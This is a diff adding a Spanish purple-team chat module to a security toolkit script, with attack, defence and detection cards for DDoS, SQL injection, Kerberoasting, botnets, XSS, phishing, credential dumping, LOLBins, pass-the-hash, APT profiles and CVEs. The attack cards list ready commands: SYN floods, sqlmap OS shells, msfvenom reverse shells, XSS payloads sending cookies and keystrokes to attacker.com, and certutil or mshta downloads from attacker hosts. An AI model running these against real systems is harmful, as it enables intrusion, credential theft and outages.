@@ -442,6 +442,277 @@ T1486 - Data Encrypted for Impact:
 # ahora son importados directamente por hacx_advanced.sh
 
 # ----------------------------------------------------------------
+# BLOQUE 4.5: MÓDULO 7 CHAT LIBRE
+# Formato Purple Team: 🔴 ATAQUE ||| 🔵 DEFENSA ||| 🟣 DETECCIÓN
+# ----------------------------------------------------------------
+declare -A CHAT_DATA
+
+CHAT_DATA["ddos"]="🔴 ATAQUE - Denegación de Servicio (DDoS):
+  • SYN Flood: hping3 -S -p 80 --flood --rand-source CHAT_TARGET
+  • HTTP Flood: bombardier -c 1000 -d 60s https://CHAT_TARGET
+  • Slowloris: slowloris CHAT_TARGET -s 500
+  • Amplificación DNS: python3 dns_amplification.py CHAT_TARGET -p 53
+|||
+🔵 DEFENSA - Mitigación DDoS:
+  • Cloudflare: Habilitar protección DDoS automática (Under Attack Mode)
+  • WAF: Configurar rate limiting (ej. 100 req/min por IP)
+  • Firewall/BGP: Bloquear puertos no necesarios (53/123) / RTBH
+|||
+🟣 DETECCIÓN - Tráfico Anómalo:
+  • NetFlow: Aumento súbito de tráfico asimétrico a puertos específicos
+  • Logs de Firewall: Múltiples conexiones SYN desde IPs aleatorias
+  • Monitoreo de Host: Picos inusuales de CPU/Memoria en servidores web"
+
+CHAT_DATA["sql"]="🔴 ATAQUE - Inyección SQL (SQLi):
+  • Detectar vulnerabilidad: sqlmap -u \"http://CHAT_TARGET/pagina.php?id=1\" --batch
+  • Extraer bases de datos: sqlmap -u \"http://CHAT_TARGET/pagina.php?id=1\" --dbs
+  • Dump de tablas: sqlmap -u \"http://CHAT_TARGET/pagina.php?id=1\" -D database --tables
+  • Levantar OS Shell: sqlmap -u \"http://CHAT_TARGET/pagina.php?id=1\" --os-shell
+|||
+🔵 DEFENSA - Prevenir Inyecciones:
+  • Back-end: Uso estricto de Prepared Statements (Parametrized queries)
+  • WAF: Aplicar reglas OWASP Top 10 contra SQLi (ej. ModSecurity)
+  • Frontend/Backend: Validación y sanitización estricta de variables input
+|||
+🟣 DETECCIÓN - Intentos SQLi:
+  • Event ID 4625 (o syslogs): Múltiples intentos de login fallidos con caracteres especiales
+  • Web Server Logs (Nginx/Apache): Patrones de URI con ' OR '1'='1 o %27%20OR%20
+  • DB Logs (SQL Server/MySQL): Errores de sintaxis anómalos consecutivos"
+
+CHAT_DATA["kerberoasting"]="🔴 ATAQUE - Kerberoasting (T1558.003):
+  • Enumerar SPNs: GetUserSPNs.py [dominio]/[usuario]:[pass] -dc-ip CHAT_TARGET
+  • Solicitar TGS para offline cracking: python3 GetUserSPNs.py [dominio]/[usuario]:[pass] -request
+  • Crackear offline (Hashcat): hashcat -m 13100 hash.txt rockyou.txt
+  • Crackear offline (John): john --format=krb5tgs --wordlist=rockyou.txt hash.txt
+|||
+🔵 DEFENSA - Protección de Kerberos:
+  • Política de contraseñas: Usar contraseñas largas y complejas (>25 caracteres) para cuentas de servicio
+  • Managed Service Accounts: Implementar Group Managed Service Accounts (gMSA)
+  • Active Directory: Habilitar Protected Users security group para cuentas críticas
+|||
+🟣 DETECCIÓN - Solicitudes TGS Inusuales:
+  • Event ID 4769: Múltiples solicitudes de TGS Ticket (Success o Failure) solicitadas muy rápido para la misma cuenta
+  • Tráfico de Red: Solicitudes anómalas de tickets Kerberos fuera de horario laboral habitual
+  • SIEM: Correlación de cifrado débil (RC4 - 0x17) en el Ticket Encryption Type extraído"
+
+CHAT_DATA["botnet"]="🔴 ATAQUE - Botnet y C2 (T1078 / T1071):
+  • Infección: msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=attacker LPORT=4444 -f elf > bot.elf
+  • Instalar bot persistente: scp bot.elf root@CHAT_TARGET:/tmp/ && ssh root@CHAT_TARGET 'chmod +x /tmp/bot.elf && nohup /tmp/bot.elf &'
+  • C2 HTTP: curl -s http://CHAT_TARGET/c2/tasks → el bot ejecuta órdenes remotas
+  • DNS Tunneling: dnscat2 --secret=mysecret CHAT_TARGET (túnel C2 sobre DNS)
+  • DDoS con botnet: hping3 -S -p 80 --flood --rand-source CHAT_TARGET
+|||
+🔵 DEFENSA - Prevención de Botnets:
+  • Segmentación de red: aislar hosts comprometidos con VLANs y ACLs
+  • Filtrado DNS saliente: bloquear resolución de dominios DGA o recientes
+  • EDR/XDR: detectar procesos persistentes anómalos y reverse shells
+  • UEBA: tráfico saliente anómalo en horario nocturno hacia IPs desconocidas
+|||
+🟣 DETECCIÓN - Indicadores de Compromiso (IoC):
+  • Sysmon ID 3: Conexiones de red hacia IPs externas desde procesos del sistema
+  • DNS: Consultas a dominios con alta entropía (generados por DGA)
+  • NetFlow: Beaconing periódico (pings al C2 cada N segundos exactos)
+  • Event ID 4697/7045: Servicio instalado de forma inusual"
+
+CHAT_DATA["xss"]="🔴 ATAQUE - Cross-Site Scripting XSS (T1059.007):
+  • Reflected XSS probe: curl 'https://CHAT_TARGET/search?q=<script>alert(1)</script>'
+  • Stored XSS payload: <script>fetch('https://attacker.com/?c='+document.cookie)</script>
+  • DOM XSS: <img src=x onerror=\"fetch('https://attacker.com/?d='+document.domain)\">
+  • Keylogger XSS: <script>document.onkeypress=e=>{fetch('//attacker.com/?k='+e.key)}</script>
+  • Tool: xsstrike -u https://CHAT_TARGET/search --fuzzer
+|||
+🔵 DEFENSA - Prevención XSS:
+  • Content Security Policy (CSP): Content-Security-Policy: default-src 'self'
+  • Output encoding: Escapar < > & \" ' antes de renderizar en HTML
+  • HttpOnly + Secure en cookies: Set-Cookie: sessionid=...; HttpOnly; Secure; SameSite=Strict
+  • Sanitización: usar DOMPurify (JS) o Bleach (Python) para limpiar inputs
+|||
+🟣 DETECCIÓN - Intentos de XSS:
+  • WAF Logs: Patrones <script>, onerror=, javascript: en parámetros de peticiones
+  • SIEM: Request con User-Agent o parámetros con codificación base64 o unicode anómala
+  • Correlación: múltiples errores 400/403 con payloads similares en ventana corta de tiempo"
+
+CHAT_DATA["phishing"]="🔴 ATAQUE - Phishing (T1566):
+  • Clone & Phish: gophish → clonar login de CHAT_TARGET, enviar campaña a usuarios
+  • Adjunto malicioso: msfvenom -p windows/meterpreter/reverse_https LHOST=attacker LPORT=443 -f docx
+  • Email spoofing: swaks --to victim@CHAT_TARGET --from IT@CHAT_TARGET --server mail.CHAT_TARGET --header 'Subject: Reset urgente'
+  • Evilginx2: proxy inverso para capturar tokens 2FA en login de CHAT_TARGET
+  • Typosquatting: registrar ch4t-target.com y redirigir usuarios de CHAT_TARGET
+|||
+🔵 DEFENSA - Anti-Phishing:
+  • Email: Configurar DMARC p=reject + DKIM + SPF estricto para CHAT_TARGET
+  • ATP: Activar Safe Links y Safe Attachments en Microsoft 365 / Google Workspace
+  • Awareness: Simulaciones de phishing mensuales + formación OSCP-style
+  • DNS: Monitorear dominios typosquatting de CHAT_TARGET con servicios como dnstwist
+|||
+🟣 DETECCIÓN - Indicadores de Phishing:
+  • Email Gateway logs: adjuntos .docx/.xlsm con macros sospechosas enviados masivamente
+  • SIEM: Proceso hijo de Outlook/Word/Excel → cmd.exe o powershell.exe
+  • DNS: Resolución de dominio registrado en últimas 72h desde red corporativa
+  • UEBA: Primer acceso exitoso desde país no habitual justo tras clic en email sospechoso"
+
+CHAT_DATA["hash"]="🔴 ATAQUE - Hash Cracking y Dumping (T1003 / T1110):
+  • Dump NTLM (Windows): secretsdump.py DOMAIN/admin:pass@CHAT_TARGET
+  • Dump Linux: ssh root@CHAT_TARGET 'cat /etc/shadow' > shadow.txt
+  • Crackear MD5: hashcat -m 0 -a 0 hash.txt rockyou.txt
+  • Crackear NTLM: hashcat -m 1000 ntlm.txt rockyou.txt --rules=best64.rule
+  • Crackear SHA256: hashcat -m 1400 sha256.txt -a 3 ?u?l?l?l?d?d
+  • Identificar tipo: hash-identifier < hash.txt
+|||
+🔵 DEFENSA - Protección de Credenciales:
+  • Credential Guard: Activar en Windows 10/11 y Server 2016+ (aísla LSASS en VM)
+  • Linux: Usar SHA-512 con salt en /etc/shadow (yescrypt en distros modernas)
+  • Gestor de contraseñas: CyberArk / BeyondTrust para cuentas privilegiadas
+  • Política mínima: Longitud mínima de 16 chars + MFA obligatorio para admins
+|||
+🟣 DETECCIÓN - Actividad de Cracking:
+  • Event ID 4661/4663: Acceso a objeto LSASS (Windows) → posible dump de credenciales
+  • Sysmon ID 10: ProcessAccess a lsass.exe desde proceso no-sistema
+  • Auth logs Linux: Múltiples intentos fallidos de autenticación SSH en /var/log/auth.log
+  • SIEM: Correlacionar dump de hashes + inicio de sesión exitoso horas después"
+
+CHAT_DATA["lolbins"]="🔴 ATAQUE - Living Off The Land Binaries (T1218):
+  • certutil: certutil -urlcache -split -f http://attacker.com/shell.exe C:\\Windows\\Temp\\svcs.exe
+  • mshta: mshta.exe http://attacker.com/payload.hta (ejecuta HTA remoto en CHAT_TARGET)
+  • regsvr32: regsvr32 /s /u /i:http://attacker.com/x.sct scrobj.dll (sin tocar disco local)
+  • msiexec: msiexec /q /i http://attacker.com/CHAT_TARGET_payload.msi
+  • wmic: wmic /node:CHAT_TARGET process call create \"cmd.exe /c whoami > C:\\out.txt\"
+  • bitsadmin: bitsadmin /transfer job /download /priority normal http://attacker.com/b.exe C:\\b.exe
+|||
+🔵 DEFENSA - Bloquear LoLBINs:
+  • WDAC/AppLocker: Deshabilitar certutil para descargas HTTP, mshta sin firma
+  • ASR (Attack Surface Reduction): Habilitar reglas en Defender for Endpoint
+  • Proxy saliente: Bloquear peticiones HTTP desde procesos del sistema (certutil, bitsadmin)
+  • GPO: Deshabilitar WMIC remoto para usuarios no administradores
+|||
+🟣 DETECCIÓN - Uso Anómalo de Binarios del SO:
+  • Sysmon ID 1: certutil -urlcache / mshta http / regsvr32 /i:http (args de red en binarios legítimos)
+  • Sysmon ID 3: Conexión de red desde msiexec, certutil, rundll32 a IPs externas
+  • PowerShell logging: Invoke-Expression o DownloadString en logs de AMSI
+  • SIEM: Correlación binario firmado → red externa → nuevo proceso hijo → alert"
+
+CHAT_DATA["pth"]="🔴 ATAQUE - Pass-the-Hash (T1550.002):
+  • Usando impacket psexec: psexec.py -hashes :NTLM_HASH DOMAIN/admin@CHAT_TARGET
+  • Usando wmiexec: wmiexec.py -hashes :NTLM_HASH DOMAIN/admin@CHAT_TARGET whoami
+  • Usando smbexec: smbexec.py -hashes :NTLM_HASH DOMAIN/admin@CHAT_TARGET
+  • Con CrackMapExec: crackmapexec smb CHAT_TARGET -u admin -H NTLM_HASH
+  • Mimikatz PtH: sekurlsa::pth /user:admin /domain:DOMAIN /ntlm:HASH /run:cmd.exe
+|||
+🔵 DEFENSA - Protección contra PtH:
+  • Credential Guard: Aísla LSASS en contenedor virtualizado (Windows 10+)
+  • LAPS: Local Administrator Password Solution para contraseñas locales únicas por equipo
+  • Deshabilitar NTLM: Usar solo Kerberos donde sea posible en Active Directory
+  • Tier Model: Separar cuentas admin de nivel 0, 1 y 2 para limitar el impacto lateral
+|||
+🟣 DETECCIÓN - Pass-the-Hash:
+  • Event ID 4624 Type 3 con cuenta admin desde IP no habitual → sospechoso
+  • Event ID 4648: Inicio de sesión con credenciales explícitas (PtH usa NTLM directo)
+  • Sysmon ID 1: mimikatz.exe, sekurlsa::pth en args de proceso
+  • NetFlow: Conexiones SMB laterales masivas este-oeste en red interna"
+
+CHAT_DATA["apt29"]="🔴 PERFIL APT - APT29 / Cozy Bear (SVR Rusia):
+  • Alias: Cozy Bear, Midnight Blizzard, NOBELIUM | Atribución: Servicio de Inteligencia Exterior de Rusia (SVR)
+  • Campañas: SolarWinds SUNBURST (2020), Microsoft 365 tenants (2023), COVID-19 vacunas (2021)
+  • T1566.001 Spear Phishing: swaks --to objetivo@CHAT_TARGET --attach malware.pdf
+  • T1195 Compromiso cadena de suministro: SolarWinds Orion DLL backdoor (SUNBURST)
+  • T1021.002 SMB/Lateral: wmiexec.py DOMAIN/admin:pass@CHAT_TARGET (movimiento lateral sigiloso)
+  • T1027 Obfuscación: Droppers cifrados + esteganografía en imágenes PNG
+|||
+🔵 DEFENSA - Contra APT29:
+  • Zero Trust: Verificación continua, mínimo privilegio, acceso Just-in-Time (JIT)
+  • Supply Chain: Auditar integridad de software de terceros (SolarWinds, OKTA, etc.)
+  • MFA resistente a phishing: FIDO2/WebAuthn + llaves de hardware Yubikey
+  • Hunting: Buscar procesos WMI/DCOM anómalos y conexiones fuera de horario
+|||
+🟣 DETECCIÓN - Indicadores APT29:
+  • Comunicación C2 en HTTPS imitando servicios legítimos (OneDrive, Teams API)
+  • SUNBURST IoC: módulo SolarWinds.Orion.Core.BusinessLayer.dll con hash conocido
+  • Event ID 4769: Solicitudes TGS para servicios internos no habituales
+  • SIEM: Login a aplicaciones M365/Azure AD desde IPs presentes en listas negras SVR"
+
+CHAT_DATA["apt38"]="🔴 PERFIL APT - APT38 / Lazarus Group (RPDC Corea del Norte):
+  • Alias: Lazarus, ZINC, Hidden Cobra | Atribución: Reconnaissance General Bureau – Corea del Norte
+  • Campañas: Bangladesh Bank SWIFT \$81M (2016), Sony Pictures hack, WannaCry ransomware (2017)
+  • T1566.001 Spearphishing: Documentos Word con macros para empleados de CHAT_TARGET
+  • T1059.003 Cmd Shell: certutil -urlcache -f http://evil.com/beacon.exe %TEMP%\\svcs.exe
+  • T1071.001 C2 HTTP/S: Beaconing usando dominios comprometidos → exfiltración SWIFT
+  • T1485 Destrucción: DESTOVER wiper tras completar exfiltración desde CHAT_TARGET
+|||
+🔵 DEFENSA - Contra APT38:
+  • SWIFT: Impl. SWIFT Customer Security Programme (CSP) mandatorio
+  • Segmentación: Aislar redes financieras/bancarias en VLANs estrictas
+  • EDR: Detectar acceso a archivos .swift, MT103, MT202 por procesos no autorizados
+  • Backups: 3-2-1 con copia offline air-gapped para resistir wiper attacks
+|||
+🟣 DETECCIÓN - Indicadores APT38:
+  • Hashes de wiper DESTOVER y HOPLIGHT en bases de CISA/FBI IoC feeds
+  • Conexiones SWIFT anómalas: mensajes de transferencia fuera de horario o con destinos inusuales
+  • Event ID 7045/4697: Servicios instalados con nombres aleatorios (ej: svchost64.exe)
+  • NetFlow: Gran descarga de datos internos (stage previo a destrucción con wiper)"
+
+CHAT_DATA["fin7"]="🔴 PERFIL APT - FIN7 / Carbanak (Crimen Organizado):
+  • Alias: Carbanak Group, ELBRUS, Carbon Spider | Motivación: Financiera — robo de tarjetas, ransomware
+  • Campañas: Carbanak \$1B+ en bancos (2013-2018), POS RAM scrapers, ALPHV/BlackCat ransomware
+  • T1566.001 Spear Phishing: Quejas falsas de clientes con ZIP/VBS maliciosos a CHAT_TARGET
+  • T1059.001 PowerShell: stageless payload PS en memoria → Cobalt Strike CS beacon
+  • T1056.001 Keylogging: BlackPOS keylogger en terminales POS para robar tarjetas de CHAT_TARGET
+  • T1486 Ransomware: ALPHV en ataques double-extortion post-exfiltración de datos
+|||
+🔵 DEFENSA - Contra FIN7:
+  • POS Security: Tokenización de tarjetas + Point-to-Point Encryption (P2PE) en terminales
+  • Email: Bloquear archivos ZIP/VBS/LNK adjuntos en gateway para CHAT_TARGET
+  • EDR: Detección de beacon Cobalt Strike (default config), redes CS teamservers
+  • Segmentación: Aislar red de POS del resto de la organización (PCI-DSS)
+|||
+🟣 DETECCIÓN - Indicadores FIN7:
+  • Hashes conocidos de BABYMETAL, BIRDWATCH, CARBANAK en CISA AA22-083A
+  • Event ID 4104: PowerShell con download de Stage 2 (IEX, DownloadString, WebClient)
+  • NetFlow: Beacon periódico cada 60s hacia C2 no categorizado en threat intelligence
+  • Endpoint: Proceso PowerShell o wscript.exe hijo de Outlook o Word"
+
+CHAT_DATA["trivia"]="📝 ¿SABÍAS QUE? — Inteligencia de Amenazas 2024-2025:
+  • El 91% de los ciberataques comienzan con un email de phishing (T1566). [Proofpoint 2024]
+  • El tiempo medio de detección (MTTD) de una brecha en 2024 fue de 194 días. [IBM Cost of Breach 2024]
+  • Kerberoasting (T1558.003) permite crackear tickets TGS sin ser admin de dominio.
+  • LOLBAS: certutil, mshta y regsvr32 son los binarios legítimos más abusados en 2024.
+  • Pass-the-Hash (T1550.002) sigue funcionando en el 70% de entornos Windows sin LAPS.
+  • BloodHound mapea todos los paths a Domain Admin en menos de 2 minutos en AD típicos.
+  • El ransomware ALPHV/BlackCat cobró rescates de hasta \$22M por víctima en 2024.
+  • CVE-2024-3400 en Palo Alto fue explotado el día 0 de su publicación por UTA0218.
+  • El 43% de las organizaciones no detectaría lateral movement activo en su red. [Mandiant 2024]
+  • APT29 (SVR) comprometió más de 100 organizaciones usando credenciales M365 en 2023.
+|||
+🔵 CONSEJO PROFESIONAL:
+  • Implementa un programa de Threat Hunting basado en MITRE ATT&CK como guía.
+  • Usa el framework de evaluaciones TIBER-EU para simular APTs realistas.
+  • Correlaciona datos de NetFlow, EDR y SIEM para detectar patrones multi-etapa.
+|||
+🟣 REFERENCIAS:
+  • MITRE ATT&CK: https://attack.mitre.org
+  • NVD CVEs: https://nvd.nist.gov
+  • CISA Known Exploited: https://www.cisa.gov/known-exploited-vulnerabilities-catalog
+  • Mandiant M-Trends 2024: https://www.mandiant.com/m-trends"
+
+CHAT_DATA["cve"]="📝 TOP CVEs CRÍTICOS 2024-2025:
+  • CVE-2024-3400 — Palo Alto PAN-OS GlobalProtect | CVSS 10.0 | RCE sin auth (command injection en log)
+  • CVE-2024-21762 — Fortinet FortiOS SSL-VPN | CVSS 9.6 | RCE out-of-bounds write sin autenticación
+  • CVE-2024-6387 — OpenSSH regreSSHion | CVSS 8.1 | Race condition en signal handler → RCE como root
+  • CVE-2024-4577 — PHP CGI Windows | CVSS 9.8 | Arg injection via Best-Fit encoding → RCE
+  • CVE-2024-27198 — JetBrains TeamCity | CVSS 9.8 | Bypass de autenticación completo → control total
+  • CVE-2025-0282 — Ivanti Connect Secure | CVSS 9.0 | Stack overflow → RCE sin auth en VPN
+  • CVE-2024-49138 — Windows CLFS Driver | CVSS 7.8 | LPE 0-day activo en campañas ransomware
+|||
+🔴 EXPLORACIÓN Y POCS:
+  • Nuclei (auto-scan): nuclei -u https://CHAT_TARGET -t cves/ -severity critical,high
+  • Check Shodan: shodan host CHAT_TARGET → ver si el servicio vulnerable está expuesto
+  • ExploitDB: searchsploit [nombre_producto] → buscar exploit público disponible
+  • Metasploit: msfconsole → search CVE-2024-XXXX → use [módulo] → set RHOSTS CHAT_TARGET
+|||
+🟣 DETECCIÓN Y MITIGACIÓN:
+  • Parchear de inmediato: suscribirse a advisories del proveedor y CISA KEV
+  • Nuclei (defensive): correr nuclei contra CHAT_TARGET para validar que el parche aplicó
+  • SIEM: Alertar en intentos de explotar CVEs conocidos via firmas IDS (Snort/Suricata)
+  • Referencia continua: https://www.cisa.gov/known-exploited-vulnerabilities-catalog"
 # BLOQUE 5: CVE RECIENTES 2024-2025
 # Formato: "Producto | CVSS | Descripción | Técnica MITRE"
 # ----------------------------------------------------------------
